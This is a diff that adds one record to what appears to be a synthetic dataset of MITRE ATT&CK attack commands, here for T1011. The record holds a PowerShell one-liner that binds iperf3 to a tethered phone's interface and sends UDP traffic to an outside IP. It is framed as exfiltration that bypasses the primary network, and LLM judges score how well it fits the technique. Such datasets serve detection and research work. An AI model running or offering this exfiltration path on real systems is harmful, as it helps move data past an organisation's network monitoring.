@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
+  "explanation": "Targets a USB\u2011tethered RNDIS interface (smartphone tether) and binds iperf3 to it, exfiltrating over the phone\u2019s cellular uplink (alternate medium) as per T1011.",
+  "rationale_steps": [
+    "Locate the USB RNDIS network adapter from a tethered phone.",
+    "Determine its IPv4 address for binding.",
+    "Run iperf3 UDP client on a high port bound to the RNDIS interface.",
+    "Leverage the phone\u2019s cellular path to bypass the primary network."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-c0a371f5",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced braces and quotes; cmdlets and iperf3 flags are correctly formed and chained with proper separators.",
+        "semantic_score": 2,
+        "semantic_justification": "It binds iperf3 traffic to a USB-tethered RNDIS interface but neither exfiltrates actual host data nor stages it onto a physical medium for transport, so it is misaligned with T1011\u2019s described behavior.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T07:01:20.038223Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses/braces, correct variable assignments, pipeline operations, and conditional logic.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly identifies a USB-tethered smartphone connection and uses iperf3 to exfiltrate data over the cellular network as an alternate physical medium, though it relies on iperf3.exe being available and doesn't include the actual data exfiltration payload.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:01:23.679458Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell cmdlets, variable assignments, conditional logic, and the external `iperf3.exe` call with its arguments are all perfectly well-formed and syntactically correct.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely identifies a USB-tethered RNDIS interface, binds `iperf3` traffic to its IP address, and sends data over this 'alternate medium' (cellular uplink via phone tether), directly aligning with the claimed intent and T1011's use of a physical medium for exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:01:36.082094Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
